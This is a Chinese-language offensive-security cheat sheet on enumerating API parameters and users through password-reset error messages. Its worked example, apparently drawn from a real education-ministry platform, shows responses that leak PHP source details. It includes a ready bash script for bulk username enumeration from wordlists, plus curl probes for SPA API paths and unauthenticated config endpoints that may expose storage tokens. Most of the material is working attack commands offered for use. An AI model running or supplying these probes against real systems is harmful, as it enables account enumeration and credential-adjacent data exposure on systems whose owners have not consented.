# API 参数枚举与信息泄露技术

## 密码重置参数枚举（错误信息驱动）

当密码重置端点返回不同错误时，可逐步发现所需参数。

### 技术流程

1. 发送最小请求，观察错误中暴露的参数名
2. 逐个添加参数，直到进入业务逻辑校验
3. 比较不同用户的响应差异，实现用户枚举

### 示例（教育部数据网络节点平台）

```bash
# Step 1: 只发 username → 暴露需要 password
curl -s -X POST -d 'username=admin' 'https://TARGET/api/login/resetting-pwd'
# {"e":"PARAM_ERROR","m":"参数错误","d":{"param":"password"}}

# Step 2: 添加 password → 暴露需要 res_password
curl -s -X POST -d 'username=admin&password=x' 'https://TARGET/api/login/resetting-pwd'
# {"e":"PARAM_ERROR","m":"参数错误","d":{"param":"res_password"}}

# Step 3: 密码相同 → 进入业务校验
curl -s -X POST -d 'username=admin&password=x&res_password=x' 'https://TARGET/api/login/resetting-pwd'
# {"e":"ERROR","m":"新密码不能与旧密码相同"}

# Step 4: 密码不同 → 用户不存在时泄露源码
curl -s -X POST -d 'username=admin&password=x&res_password=y' 'https://TARGET/api/login/resetting-pwd'
# {"e":"CODE_ERROR","m":"Attempt to read property \"first_rest_passwd\" on null Login:170"}

# Step 5: 存在的用户 → 不同错误
curl -s -X POST -d 'username=VALID_USER&password=x&res_password=y' 'https://TARGET/api/login/resetting-pwd'
# {"e":"ERROR","m":"只允许首次登录重置密码"}
```

### 可发现的信息

| 错误类型 | 含义 |
|---------|------|
| `PARAM_ERROR` + `param: "X"` | 缺少参数 X |
| `新密码不能与旧密码相同` | 密码校验前的通用验证 |
| `Attempt to read property "X" on null Model:line` | 用户不存在 + PHP 源码泄露 |
| `只允许首次登录重置密码` | 用户存在 |
| `参数不足` | 登录端点需要特定格式（可能需要 RSA 加密） |

### 批量用户枚举脚本

```bash
#!/bin/bash
# user-enum-via-reset.sh - 通过密码重置错误枚举用户
TARGET="$1"
WORDLIST="${2:-/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt}"

while read user; do
  resp=$(curl -s -X POST -d "username=$user&password=New123&res_password=Old456" \
    "$TARGET/api/login/resetting-pwd" 2>/dev/null)
  
  if echo "$resp" | grep -q "首次登录\|密码已过期\|已锁定"; then
    echo "[VALID] $user: $resp"
  elif echo "$resp" | grep -q "null Login"; then
    : # User doesn't exist
  else
    echo "[?] $user: $resp"
  fi
done < "$WORDLIST"
```

## API 端点参数发现

### 通用技术

1. 发送空请求，观察错误
2. 发送 JSON vs form-encoded，观察差异
3. 发送 GET vs POST，观察差异
4. 检查响应中的 `d.param` 字段

### 常见参数命名模式

| 首次尝试 | 可能的实际参数名 |
|---------|----------------|
| `username` | `username`, `userName`, `loginName`, `account`, `user` |
| `password` | `password`, `passWord`, `pwd`, `pass` |
| `code` | `code`, `captcha`, `verifyCode`, `smsCode` |
| `token` | `token`, `access_token`, `jwt`, `session` |

## Vue.js SPA API 基路径发现

SPA 页面在 `/page/` 或 `/app/` 时，API 通常在：
- 根路径：`/api/*`、`/site/*`、`/system/*`
- 同级路径：`/page-api/*`、`/app-api/*`
- 不在 SPA 路径下：`/page/api/*` 通常是 404 或 SPA fallback

```bash
# 测试顺序
curl -sk 'https://TARGET/api/site/info'           # 根路径 API
curl -sk 'https://TARGET/page/api/site/info'       # SPA 路径下（通常 404）
curl -sk 'https://TARGET/site/user/baseinfo'       # 无 /api/ 前缀
```

## 站点配置 API 信息泄露

许多 CMS/平台的 `/api/site/info` 或 `/api/config` 无需认证即可访问，可能泄露：
- 文件下载令牌（S3/MinIO token）
- 部门编号（可作为用户名）
- 内部系统名称
- 主题/配置信息

```bash
curl -s 'https://TARGET/api/site/info' | python3 -m json.tool
```
